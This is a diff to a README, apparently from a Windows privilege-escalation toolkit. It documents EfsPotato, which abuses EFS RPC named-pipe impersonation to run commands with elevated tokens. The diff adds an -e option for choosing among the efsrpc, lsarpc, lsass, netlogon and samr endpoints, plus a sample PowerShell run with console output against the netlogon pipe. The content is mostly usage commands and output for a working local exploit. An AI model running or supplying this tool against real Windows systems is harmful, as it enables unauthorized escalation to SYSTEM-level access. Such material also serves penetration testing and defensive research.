@@ -218,13 +218,14 @@ Usage: EfsPotato.exe [Options]
         -h, --help        : Displays this help message.
         -i, --interactive : Flag to execute command with interactive mode.
         -c, --command     : Specifies command to execute.
+        -e, --endpoint    : "efsrpc", "lsarpc", "lsass", "netlogon" or "samr".
         -s, --session     : Specifies session ID.
         -t, --timeout     : Specifies timeout in milliseconds. Default is 3,000 ms.
 
 [!] -c option is required.
 ```
 
-Usage is same as PrintSpoofer:
+Usage is same as PrintSpoofer, but you can specify some endpoint pipe name (default is "\pipe\efsrpc").
 
 ```
 PS C:\Dev> whoami /user
@@ -308,6 +309,25 @@ SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for anot
 ```
 
 ![](./figures/EfsPotato.png)
+
+If you want to try other endpoint, set endpoint pipe name with `-e` option as follows.
+As far as I tested in Win11 22H2, `efsrpc` is only abusable endpoint for Win11 22H2.
+
+```
+PS C:\Dev> .\EfsPotato.exe -i -c powershell -e netlogon
+
+[>] Trying to create named pipe.
+[+] Named pipe is created successfully.
+    [*] Path : \\.\pipe\{E452876B-D971-4C97-A3B3-D7B672AC2D32}\pipe\srvsvc
+[>] Waiting for named pipe connection.
+[>] Calling EfsRpcEncryptFileSrv().
+    [*] Target File Path   : \\localhost/pipe/{E452876B-D971-4C97-A3B3-D7B672AC2D32}\C$\PrivFu.txt
+    [*] Endpoint Pipe Name : \pipe\netlogon
+[-] Timeout.
+[*] Done.
+
+PS C:\Dev>
+```
 
 
 ## Token Duplication with WFP
